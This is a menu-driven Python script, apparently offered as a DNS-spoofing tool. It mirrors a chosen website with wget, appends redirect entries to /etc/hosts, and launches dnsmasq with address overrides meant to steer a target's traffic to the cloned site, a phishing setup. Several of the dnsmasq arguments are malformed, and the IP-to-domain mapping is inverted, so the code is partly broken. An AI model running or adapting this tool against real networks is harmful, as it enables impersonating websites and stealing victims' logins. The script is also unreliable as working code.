import os
import sys
import subprocess
import socket

def show_own_ip():
    own_ip = socket.gethostbyname(socket.gethostname())
    print(f"Your IP address is: {own_ip}")

def clone_website():
    url = input("Enter the URL of the website you want to clone: ")
    try:
        subprocess.run(["wget", "--mirror", "--convert-links", "--adjust-extension", "--page-requisites", url])
        print("Website cloned successfully!")
    except Exception as e:
        print(f"Error while cloning website: {e}")

def modify_host_file(ip_address, url):
    try:
        with open('/etc/hosts', 'a') as hostfile:
            hostfile.write(f"{ip_address} {url}\n")
        print("Host file modified successfully!")
    except Exception as e:
        print(f"Error while modifying host file: {e}")

def start_dns_spoofing(interface=None, target_ip=None, gateway_ip=None, dns_server=None):
    try:
        command = ["dnsmasq", "-C", "/etc/dnsmasq.conf"]
        if interface:
            command.extend(["-i", interface])
        if target_ip and gateway_ip:
            command.extend(["--interface=", interface, "--address=", f"/{target_ip}/{gateway_ip}"])
        if dns_server:
            command.extend(["--server=", dns_server])
        subprocess.run(command)
        print("DNS spoofing started successfully!")
    except Exception as e:
        print(f"Error while starting DNS spoofing: {e}")

def main():
    print("DNS Spoofing Steps:")
    print("1. Show your own IP address")
    print("2. Clone a website")
    print("3. Modify the host file")
    print("4. Start DNS spoofing")

    while True:
        try:
            option = int(input("Enter the step number to proceed (1-4): "))
            if option < 1 or option > 4:
                raise ValueError
            break
        except ValueError:
            print("Invalid input. Please enter a number between 1 and 4.")

    if option == 1:
        show_own_ip()
    elif option == 2:
        clone_website()
    elif option == 3:
        ip_address = input("Enter the IP address to redirect to: ")
        url = input("Enter the URL to redirect: ")
        modify_host_file(ip_address, url)
    elif option == 4:
        print("Options for starting DNS spoofing:")
        print("1. Start DNS spoofing on default interface")
        print("2. Start DNS spoofing on specific interface with target and gateway IPs")
        print("3. Start DNS spoofing with custom DNS server")

        while True:
            try:
                spoof_option = int(input("Enter the option number to proceed (1-3): "))
                if spoof_option < 1 or spoof_option > 3:
                    raise ValueError
                break
            except ValueError:
                print("Invalid input. Please enter a number between 1 and 3.")

        if spoof_option == 1:
            start_dns_spoofing()
        elif spoof_option == 2:
            interface = input("Enter the interface name: ")
            target_ip = input("Enter the target IP address: ")
            gateway_ip = input("Enter the gateway IP address: ")
            start_dns_spoofing(interface, target_ip, gateway_ip)
        elif spoof_option == 3:
            dns_server = input("Enter the custom DNS server IP address: ")
            start_dns_spoofing(dns_server=dns_server)

if __name__ == "__main__":
    main()
